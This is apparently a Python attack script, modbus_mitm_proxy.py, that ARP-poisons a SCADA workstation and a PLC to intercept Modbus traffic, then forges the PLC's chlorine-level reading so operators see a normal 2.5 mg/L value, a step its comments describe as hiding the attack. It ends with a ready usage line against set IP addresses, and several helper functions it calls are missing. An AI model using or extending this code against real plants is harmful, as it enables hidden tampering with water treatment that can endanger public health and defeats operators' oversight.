# modbus_mitm_proxy.py - Intercept SCADA↔PLC traffic

from scapy.all import *
from pymodbus.constants import Endian
from pymodbus.payload import BinaryPayloadBuilder
import struct

class ModbusMITM:
    def __init__(self, plc_ip, scada_ip):
        self.plc_ip = plc_ip
        self.scada_ip = scada_ip
        self.modifications = {}

    def start_mitm(self):
        """
        ARP spoof to position between SCADA and PLC
        """
        import threading

        # Start ARP spoofing
        spoof_thread = threading.Thread(target=self.arp_spoof)
        spoof_thread.start()

        # Start packet interception
        sniff(filter=f"tcp port 502 and (host {self.plc_ip} or host {self.scada_ip})",
              prn=self.packet_handler, store=0)

    def arp_spoof(self):
        """
        Poison ARP cache of SCADA and PLC
        """
        while True:
            # Tell SCADA that we are PLC
            send(ARP(op=2, pdst=self.scada_ip, psrc=self.plc_ip, hwdst=get_mac(self.scada_ip)))

            # Tell PLC that we are SCADA
            send(ARP(op=2, pdst=self.plc_ip, psrc=self.scada_ip, hwdst=get_mac(self.plc_ip)))

            time.sleep(2)

    def packet_handler(self, pkt):
        """
        Intercept and modify Modbus packets
        """
        if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
            # SCADA → PLC (write requests)
            if pkt[IP].dst == self.plc_ip:
                self.handle_scada_to_plc(pkt)

        elif pkt.haslayer(TCP) and pkt[TCP].sport == 502:
            # PLC → SCADA (responses)
            if pkt[IP].src == self.plc_ip:
                self.handle_plc_to_scada(pkt)

    def handle_plc_to_scada(self, pkt):
        """
        Spoof sensor readings to hide attack
        """
        if pkt.haslayer(Raw):
            modbus_data = pkt[Raw].load

            # If reading chlorine level (register MW102)
            if self.is_read_response(modbus_data, register=102):
                # Spoof reading to show normal level (2.5 mg/L)
                fake_value = 25  # 2.5 * 10
                modified_pkt = self.modify_modbus_response(pkt, fake_value)

                # Forward spoofed packet to SCADA
                send(modified_pkt)
                return  # Drop original packet

        # Forward unmodified packet
        send(pkt)

# Usage
mitm = ModbusMITM('192.168.10.100', '192.168.10.20')
mitm.start_mitm()
